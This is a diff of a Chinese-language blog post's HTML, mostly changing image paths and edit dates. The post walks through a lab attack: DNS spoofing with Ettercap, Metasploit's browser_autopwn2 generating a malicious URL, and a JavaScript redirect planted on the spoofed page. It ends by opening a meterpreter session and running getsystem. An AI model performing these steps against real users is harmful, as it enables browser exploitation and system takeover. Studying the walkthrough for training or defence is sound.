@@ -104,20 +104,20 @@
 <meta property="og:site_name" content="Emerald Dream">
 <meta property="og:description" content="1.工具介绍1.1Ettercap Ettercap是一个全面中间人攻击工具。它具有实时连接嗅探、动态内容过滤和许多其他有趣的功能。它支持对许多协议的主动和被动分析，并包含许多用于网络和主机分析的特性。  1.2MSF模块：browser_autopwn2 browser_autopwn2是Metasploit提供的辅助功能模块。在受害者访问Web页面时，它会自动攻击受害者的浏览器。在开始攻击之前">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="https://chirec.github.io/2019/04/08/I-Want-to-see-U/04/08/I-Want-to-see-U/01.apache2.png">
-<meta property="og:image" content="https://chirec.github.io/2019/04/08/I-Want-to-see-U/04/08/I-Want-to-see-U/02.evil_URL.png">
-<meta property="og:image" content="https://chirec.github.io/2019/04/08/I-Want-to-see-U/04/08/I-Want-to-see-U/03.jump_script.png">
-<meta property="og:image" content="https://chirec.github.io/2019/04/08/I-Want-to-see-U/04/08/I-Want-to-see-U/04.visit.png">
-<meta property="og:image" content="https://chirec.github.io/2019/04/08/I-Want-to-see-U/04/08/I-Want-to-see-U/05.auto_jump.png">
-<meta property="og:image" content="https://chirec.github.io/2019/04/08/I-Want-to-see-U/04/08/I-Want-to-see-U/06.open_sessions.png">
-<meta property="og:image" content="https://chirec.github.io/2019/04/08/I-Want-to-see-U/04/08/I-Want-to-see-U/07.sessions_list.png">
-<meta property="og:image" content="https://chirec.github.io/2019/04/08/I-Want-to-see-U/04/08/I-Want-to-see-U/08.sessions_choose.png">
-<meta property="og:image" content="https://chirec.github.io/2019/04/08/I-Want-to-see-U/04/08/I-Want-to-see-U/09.shell.png">
-<meta property="og:updated_time" content="2019-07-04T11:22:16.670Z">
+<meta property="og:image" content="https://chirec.github.io/2019/04/08/I-Want-to-see-U/01.apache2.png">
+<meta property="og:image" content="https://chirec.github.io/2019/04/08/I-Want-to-see-U/02.evil_URL.png">
+<meta property="og:image" content="https://chirec.github.io/2019/04/08/I-Want-to-see-U/03.jump_script.png">
+<meta property="og:image" content="https://chirec.github.io/2019/04/08/I-Want-to-see-U/04.visit.png">
+<meta property="og:image" content="https://chirec.github.io/2019/04/08/I-Want-to-see-U/05.auto_jump.png">
+<meta property="og:image" content="https://chirec.github.io/2019/04/08/I-Want-to-see-U/06.open_sessions.png">
+<meta property="og:image" content="https://chirec.github.io/2019/04/08/I-Want-to-see-U/07.sessions_list.png">
+<meta property="og:image" content="https://chirec.github.io/2019/04/08/I-Want-to-see-U/08.sessions_choose.png">
+<meta property="og:image" content="https://chirec.github.io/2019/04/08/I-Want-to-see-U/09.shell.png">
+<meta property="og:updated_time" content="2019-09-10T13:55:58.804Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="&#39;使用Ettercap和MSF模块进行DNS欺骗，并植入后门&#39;">
 <meta name="twitter:description" content="1.工具介绍1.1Ettercap Ettercap是一个全面中间人攻击工具。它具有实时连接嗅探、动态内容过滤和许多其他有趣的功能。它支持对许多协议的主动和被动分析，并包含许多用于网络和主机分析的特性。  1.2MSF模块：browser_autopwn2 browser_autopwn2是Metasploit提供的辅助功能模块。在受害者访问Web页面时，它会自动攻击受害者的浏览器。在开始攻击之前">
-<meta name="twitter:image" content="https://chirec.github.io/2019/04/08/I-Want-to-see-U/04/08/I-Want-to-see-U/01.apache2.png">
+<meta name="twitter:image" content="https://chirec.github.io/2019/04/08/I-Want-to-see-U/01.apache2.png">
 
 
 
@@ -401,7 +401,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-07-04 19:22:16" itemprop="dateModified" datetime="2019-07-04T19:22:16+08:00">2019-07-04</time>
+                <time title="Modified: 2019-09-10 21:55:58" itemprop="dateModified" datetime="2019-09-10T21:55:58+08:00">2019-09-10</time>
               
             
           </span>
@@ -486,27 +486,27 @@
 <a id="more"></a>
 <h1 id="3-实验过程"><a href="#3-实验过程" class="headerlink" title="3.实验过程"></a>3.实验过程</h1><h2 id="3-1使用Ettercap进行DNS欺骗"><a href="#3-1使用Ettercap进行DNS欺骗" class="headerlink" title="3.1使用Ettercap进行DNS欺骗"></a>3.1使用Ettercap进行DNS欺骗</h2><p>DNS欺骗过程和<a href="https://chirec.github.io/2019/03/26/I-can-not-see-U/">使用Ettercap和SET进行DNS欺骗、钓鱼</a>过程相同，可以查看这篇文章。<br>注意：进行DNS欺骗后，要开启Apache2服务才可以正常访问。上一篇中，SET自动开启了80端口，所以不需要开启Apache2服务。<br>开启Apache2服务命令</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/apache2 start</span><br><span class="line">/etc/init.d/apache2 status</span><br></pre></td></tr></table></figure>
-<img src="/2019/04/08/I-Want-to-see-U/04/08/I-Want-to-see-U/01.apache2.png">
+<p><img src="/2019/04/08/I-Want-to-see-U/01.apache2.png" alt></p>
 <h2 id="3-2MSF模块生成恶意URL"><a href="#3-2MSF模块生成恶意URL" class="headerlink" title="3.2MSF模块生成恶意URL"></a>3.2MSF模块生成恶意URL</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/postgresql start</span><br><span class="line">msfdb init</span><br><span class="line">msfconsole</span><br><span class="line">search browser_autopwn2</span><br><span class="line">use auxiliary/server/browser_autopwn2</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 <p>没有什么需要修改的设置，使用模块之后，直接run就可以生成恶意URL了</p>
-<img src="/2019/04/08/I-Want-to-see-U/04/08/I-Want-to-see-U/02.evil_URL.png">
+<p><img src="/2019/04/08/I-Want-to-see-U/02.evil_URL.png" alt></p>
 <h2 id="3-3添加跳转脚本"><a href="#3-3添加跳转脚本" class="headerlink" title="3.3添加跳转脚本"></a>3.3添加跳转脚本</h2><p>生成URL过程比较慢，这段时间我们给主页添加跳转脚本</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt; </span><br><span class="line">// 以下方式定时跳转</span><br><span class="line">setTimeout(&quot;javascript:location.href=&apos;Hello！&apos;&quot;, 1000); </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 <p>将上方代码中的Hello！替换为MSF生成的恶意URL即可。</p>
-<img src="/2019/04/08/I-Want-to-see-U/04/08/I-Want-to-see-U/03.jump_script.png">
+<p><img src="/2019/04/08/I-Want-to-see-U/03.jump_script.png" alt></p>
 <h2 id="3-4靶机访问"><a href="#3-4靶机访问" class="headerlink" title="3.4靶机访问"></a>3.4靶机访问</h2><p>访问<a href="www.baidu.com">www.baidu.com</a>，可以看到访问的是刚刚写的index.html</p>
-<img src="/2019/04/08/I-Want-to-see-U/04/08/I-Want-to-see-U/04.visit.png">
+<p><img src="/2019/04/08/I-Want-to-see-U/04.visit.png" alt></p>
 <p>自动跳转到恶意URL</p>
-<img src="/2019/04/08/I-Want-to-see-U/04/08/I-Want-to-see-U/05.auto_jump.png">
+<p><img src="/2019/04/08/I-Want-to-see-U/05.auto_jump.png" alt></p>
 <h2 id="3-5测试结果"><a href="#3-5测试结果" class="headerlink" title="3.5测试结果"></a>3.5测试结果</h2><p>在靶机访问恶意URL之后，MSF开始根据浏览器版本选择使用EXP并创建会话</p>
-<img src="/2019/04/08/I-Want-to-see-U/04/08/I-Want-to-see-U/06.open_sessions.png">
+<p><img src="/2019/04/08/I-Want-to-see-U/06.open_sessions.png" alt></p>
 <h2 id="3-6启动会话"><a href="#3-6启动会话" class="headerlink" title="3.6启动会话"></a>3.6启动会话</h2><p>MSF创建会话之后，我们需要手动启用会话</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions -l</span><br></pre></td></tr></table></figure>
-<img src="/2019/04/08/I-Want-to-see-U/04/08/I-Want-to-see-U/07.sessions_list.png">
+<p><img src="/2019/04/08/I-Want-to-see-U/07.sessions_list.png" alt></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions -i 1</span><br></pre></td></tr></table></figure>
-<img src="/2019/04/08/I-Want-to-see-U/04/08/I-Want-to-see-U/08.sessions_choose.png">
+<p><img src="/2019/04/08/I-Want-to-see-U/08.sessions_choose.png" alt></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getuid</span><br><span class="line">getsystem</span><br><span class="line">getuid</span><br></pre></td></tr></table></figure>
-<img src="/2019/04/08/I-Want-to-see-U/04/08/I-Want-to-see-U/09.shell.png">
+<p><img src="/2019/04/08/I-Want-to-see-U/09.shell.png" alt></p>
 <h1 id="4-参考"><a href="#4-参考" class="headerlink" title="4.参考"></a>4.参考</h1><p>[1] <a href="https://blog.csdn.net/Sufeiboy/article/details/57407019" target="_blank" rel="noopener">MSF自动化浏览器攻击与后门安装</a></p>
 
       
